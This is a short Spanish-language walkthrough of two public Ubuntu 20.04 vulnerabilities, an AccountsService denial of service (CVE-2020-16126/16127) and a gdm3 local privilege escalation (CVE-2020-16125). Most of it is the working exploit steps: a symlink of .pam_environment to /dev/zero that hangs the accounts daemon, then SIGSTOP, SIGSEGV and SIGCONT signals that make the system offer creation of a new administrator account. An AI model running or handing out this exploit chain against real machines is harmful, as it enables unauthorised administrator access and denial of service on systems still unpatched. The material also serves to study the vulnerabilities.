Entorno:Ubuntu 20.04

DoS (CVE-2020-16126,16127)

Descripción
Una modificación específica de Ubuntu para AccountsService en versiones anteriores a 0.6.55-0ubuntu13.2, entre otras versiones anteriores, eliminó incorrectamente el ruid, lo que permitió a usuarios que no eran de confianza enviar señales a AccountService, impidiendo así que manejara los mensajes D-Bus de manera oportuna

https://www.incibe-cert.es/alerta-temprana/vulnerabilidades/cve-2020-16126      
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16126

#ln -s /dev/zero .pam_environment
Cambiar el idioma, y se nos quedará “congelada” la ventana, si volvemos a la línea de comandos, con el comando top, podemos ver que el consumo de la CPU es casi del 100%, si reiniciásemos la máquina en este punto se quedaría bloqueada, por lo que debemos eliminar el fichero.

#rm .pam_environment

LPE (CVE-2020-16125)

Descripción:
Las versiones de gdm3 anteriores a la 3.36.2 o a la 3.38.2 iniciarían gnome-initial-setup si gdm3 no puede contactar con el servicio accountservice a través de dbus de forma oportuna; en Ubuntu (y potencialmente en sus derivados) esto podría encadenarse con un problema adicional que podría permitir a un usuario local crear una nueva cuenta con privilegios.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-16125     

Siguiendo la anterior vulnerabilidad, buscamos el pid del demonio accounts

#pidof account-daemon

Lanzamos una señal de parada sobre el pid obtenido:

#kill -SIGSTOP pid

Y finalmente:

#nohup bash -c “sleep 30s; kill -SIGSEGV pid; kill -SIGCONT pid”

Esto hará que al cerrar la sesión y reiniciar, vemos que se nos abren una serie de ventanas para crear un usuario con privilegios de administrador.
